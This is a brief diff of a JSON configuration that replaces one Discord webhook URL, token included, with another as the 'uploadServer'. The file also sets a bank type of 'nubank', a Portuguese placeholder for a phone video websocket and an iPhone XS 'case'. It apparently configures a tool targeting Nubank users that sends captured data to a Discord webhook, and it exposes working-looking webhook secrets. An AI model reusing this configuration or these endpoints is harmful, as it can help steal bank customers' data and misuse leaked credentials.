@@ -2,7 +2,7 @@
   "token": "MN295-YJCE4-K6F7S-M5PBE",
   "client": {
     "bankType": "nubank",
-    "uploadServer": "https://discord.com/api/webhooks/974350968307216454/NWvq9vFtsqLTAkYqDdBA9HW07QT7ObQExj4qjXdOgU5XAcSnTJsahIpmKChI_GuRIyE1",
+    "uploadServer": "https://discord.com/api/webhooks/1174171340375326761/cCRG8XYP-6Jl4EZYKHUV9qOcfHNKsDMXsIReHEfYXG_6_tpugBWgimAWusjd1MGkJdHc",
     "videoServer": "ws:/SEUIP:PORTA DO CELULAR_VIDEO",
     "case": "iphonexs",
     "isAndroid": false,
